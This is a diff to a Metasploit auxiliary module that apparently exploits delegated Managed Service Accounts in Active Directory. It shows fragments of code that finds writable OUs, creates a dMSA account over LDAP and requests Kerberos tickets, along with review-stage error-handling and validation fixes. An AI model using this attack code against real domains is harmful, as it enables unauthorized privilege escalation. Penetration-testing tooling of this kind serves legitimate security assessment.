@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Author' => [
           'AngelBoy', # discovery
-          'Spencer McIntyre', # Help with the Kerberos Bits
+          'Spencer McIntyre', # Help with Kerberos implementation and a number of improvements during review
           'jheysel-r7' # module
         ],
         'References' => [
@@ -80,19 +80,14 @@ class MetasploitModule < Msf::Auxiliary
   def validate
     errors = {}
 
-    unless %w[ auto ntlm plaintext]
-      # if AUTO changes in the future to not require a password, we'll need to reevaluate this
-      errors['LDAP::Auth'] = 'Only password-based LDAP authentication methods are supported with this exploit.'
-    end
-
     case action.name
     when 'GET_TICKET'
-      if %w[ auto ntlm ].include?(datastore['LDAP::Auth']) && Net::NTLM.is_ntlm_hash?(datastore['LDAPPassword'].encode(::Encoding::UTF_16LE))
+      if %w[auto ntlm].include?(datastore['LDAP::Auth']) && Net::NTLM.is_ntlm_hash?(datastore['LDAPPassword'].encode(::Encoding::UTF_16LE))
         errors['LDAPPassword'] = 'The GET_TICKET action is incompatible with LDAP passwords that are NTLM hashes.'
       end
     end
 
-    raise Msf::OptionValidateError.new(errors) unless errors.empty?
+    raise Msf::OptionValidateError, errors unless errors.empty?
   end
 
   def check
@@ -125,9 +120,13 @@ class MetasploitModule < Msf::Auxiliary
       Exploit::CheckCode::Appears
     end
   rescue Errno::ECONNRESET
-    return Exploit::CheckCode::Unknown('The connection was reset')
-  rescue Rex::ConnectionError, Net::LDAP::Error => e
-    return Exploit::CheckCode::Unknown(e.message)
+    fail_with(Failure::Disconnected, 'The connection was reset.')
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::NoAccess, e.message)
+  rescue Net::LDAP::Error => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
   def get_ous_we_can_write_to
@@ -174,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
     sam_account_name = account_name
     sam_account_name += '$' unless sam_account_name.ends_with?('$')
     dn = "CN=#{account_name},#{writeable_dn}"
-    print_status("Attempting to create dmsa account cn: #{account_name}, dn: #{dn}")
+    print_status("Attempting to create dMSA account CN: #{account_name}, DN: #{dn}")
 
     dmsa_attributes = {
       'objectclass' => ['top', 'person', 'organizationalPerson', 'user', 'computer', 'msDS-DelegatedManagedServiceAccount'],
@@ -230,7 +229,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def query_account(account_name)
-    account_name = datastore['DMSA_ACCOUNT_NAME']
     account_name += '$' unless account_name.ends_with?('$')
     entry = adds_get_object_by_samaccountname(@ldap, account_name)
 
